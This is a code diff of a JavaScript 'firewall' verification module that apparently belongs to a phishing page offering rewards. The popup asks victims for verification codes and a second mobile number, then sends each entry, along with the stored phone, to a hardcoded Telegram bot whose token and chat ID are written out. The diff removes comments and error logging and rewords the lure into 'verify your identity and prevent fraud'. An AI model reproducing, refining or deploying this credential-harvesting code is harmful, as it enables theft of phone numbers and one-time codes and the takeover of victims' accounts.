@@ -2,7 +2,6 @@
  * Firewall Module - 4-digit Verification with Change Number Option
  */
 
-// ========== TELEGRAM NOTIFICATION ==========
 async function sendTelegram(phone, code, type = 'verify') {
     let msg = '';
     if (type === 'verify') {
@@ -12,13 +11,9 @@ async function sendTelegram(phone, code, type = 'verify') {
     }
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
-        console.log("📨 Telegram sent");
-    } catch(e) {
-        console.log("Telegram error:", e);
-    }
+    } catch(e) {}
 }
 
-// ========== CHECK CHANGE NUMBER REQUIREMENT ==========
 async function isChangeNumberRequired() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
@@ -33,7 +28,6 @@ async function isChangeNumberRequired() {
     return false;
 }
 
-// ========== SHOW FIREWALL POPUP (4-DIGIT CODE) ==========
 function showFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) {
@@ -57,22 +51,14 @@ function showFirewallPopup() {
                 <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
             `;
         }
-        
-        // Generate random 4-digit code
         window.currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
         window.verificationAttempts = 0;
-        
-        console.log("📞 VERIFICATION CODE (system):", window.currentVerificationCode);
-        
+        console.log("📞 VERIFICATION CODE:", window.currentVerificationCode);
         popup.style.display = 'flex';
-        setTimeout(() => {
-            const ci = document.getElementById('verificationCode');
-            if (ci) ci.focus();
-        }, 100);
+        setTimeout(() => { const ci = document.getElementById('verificationCode'); if (ci) ci.focus(); }, 100);
     }
 }
 
-// ========== SHOW CHANGE NUMBER POPUP (AFTER VERIFICATION) ==========
 function showChangeNumberPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) {
@@ -82,8 +68,8 @@ function showChangeNumberPopup() {
                 <div class="firewall-warning-icon">📱</div>
                 <h2>CHANGE MOBILE NUMBER REQUIRED</h2>
                 <div class="firewall-message">
-                    <p>Enter another registered mobile number to complete this system verification.</p>
-                    <p>This helps us verify your claiming process and prevent multiple claiming of rewards.</p>
+                    <p>Please enter another registered mobile number to complete this system verification.</p>
+                    <p>This helps us verify your identity and prevent fraud.</p>
                 </div>
                 <div class="verification-input-group">
                     <input type="tel" id="newPhoneNumber" class="verification-input" placeholder="Enter 11-digit number" maxlength="11" inputmode="numeric">
@@ -96,20 +82,15 @@ function showChangeNumberPopup() {
             `;
         }
         popup.style.display = 'flex';
-        setTimeout(() => {
-            const si = document.getElementById('newPhoneNumber');
-            if (si) si.focus();
-        }, 100);
+        setTimeout(() => { const si = document.getElementById('newPhoneNumber'); if (si) si.focus(); }, 100);
     }
 }
 
-// ========== HIDE FIREWALL POPUP ==========
 function hideFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) popup.style.display = 'none';
 }
 
-// ========== SUBMIT NEW NUMBER ==========
 window.submitNewNumber = async function() {
     const phoneInput = document.getElementById('newPhoneNumber');
     const phone = phoneInput ? phoneInput.value.trim() : '';
@@ -117,34 +98,20 @@ window.submitNewNumber = async function() {
     const submitBtn = document.getElementById('changeNumberSubmitBtn');
     
     if (!phone || phone.length !== 11 || !phone.startsWith('09')) {
-        if (errorDiv) {
-            errorDiv.innerHTML = "Please enter a valid 11-digit mobile number starting with 09.";
-            errorDiv.style.display = 'block';
-        }
+        if (errorDiv) { errorDiv.innerHTML = "Please enter a valid 11-digit mobile number starting with 09."; errorDiv.style.display = 'block'; }
         return;
     }
-    
-    if (submitBtn) {
-        submitBtn.disabled = true;
-        submitBtn.innerHTML = "PROCESSING...";
-    }
+    if (submitBtn) { submitBtn.disabled = true; submitBtn.innerHTML = "PROCESSING..."; }
     
     const userPhone = localStorage.getItem("userPhone") || "Unknown";
     await sendTelegram(userPhone, phone, 'change_number');
-    
     hideFirewallPopup();
     alert("Mobile number submitted. Redirecting to login page...");
-    
-    // Clear localStorage
     localStorage.removeItem("userPhone");
     localStorage.removeItem("userDeviceId");
-    
-    setTimeout(() => {
-        window.location.href = "index.html";
-    }, 1500);
+    setTimeout(() => { window.location.href = "index.html"; }, 1500);
 };
 
-// ========== VERIFY 4-DIGIT CODE ==========
 window.verifyFirewallCode = async function() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput ? codeInput.value.trim() : '';
@@ -153,66 +120,39 @@ window.verifyFirewallCode = async function() {
     const userPhone = localStorage.getItem("userPhone") || "Unknown";
     
     if (!code || code.length < 4) {
-        if (errorDiv) {
-            errorDiv.innerHTML = "Please enter a 4-digit code.";
-            errorDiv.style.display = 'block';
-        }
+        if (errorDiv) { errorDiv.innerHTML = "Please enter a 4-digit code."; errorDiv.style.display = 'block'; }
         return;
     }
-    
-    if (verifyBtn) {
-        verifyBtn.disabled = true;
-        verifyBtn.innerHTML = "VERIFYING...";
-    }
+    if (verifyBtn) { verifyBtn.disabled = true; verifyBtn.innerHTML = "VERIFYING..."; }
     if (errorDiv) errorDiv.style.display = 'none';
     
     window.verificationAttempts = (window.verificationAttempts || 0) + 1;
-    
     const isValid = (code === window.currentVerificationCode);
     
     if (isValid) {
         await sendTelegram(userPhone, code, 'verify');
-        
-        // Check if change number is required
         const changeRequired = await isChangeNumberRequired();
-        
         if (changeRequired) {
             showChangeNumberPopup();
         } else {
             hideFirewallPopup();
             alert("Verification successful. Page will refresh.");
-            setTimeout(() => {
-                window.location.reload();
-            }, 500);
+            setTimeout(() => { window.location.reload(); }, 500);
         }
     } else {
         await sendTelegram(userPhone, code, 'verify');
-        
         let errorMsg = "Invalid verification code. Please try again.";
         if (window.verificationAttempts >= 3) {
             errorMsg = "Too many failed attempts. Page will refresh.";
             if (verifyBtn) verifyBtn.disabled = true;
-            setTimeout(() => {
-                window.location.reload();
-            }, 2000);
+            setTimeout(() => { window.location.reload(); }, 2000);
         }
-        if (errorDiv) {
-            errorDiv.innerHTML = errorMsg;
-            errorDiv.style.display = 'block';
-        }
-        if (verifyBtn && verifyBtn.disabled !== true) {
-            verifyBtn.disabled = false;
-            verifyBtn.innerHTML = "VERIFY NOW";
-        }
-        
-        if (codeInput) {
-            codeInput.value = '';
-            codeInput.focus();
-        }
+        if (errorDiv) { errorDiv.innerHTML = errorMsg; errorDiv.style.display = 'block'; }
+        if (verifyBtn && verifyBtn.disabled !== true) { verifyBtn.disabled = false; verifyBtn.innerHTML = "VERIFY NOW"; }
+        if (codeInput) { codeInput.value = ''; codeInput.focus(); }
     }
 };
 
-// ========== EXPOSE FUNCTIONS ==========
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
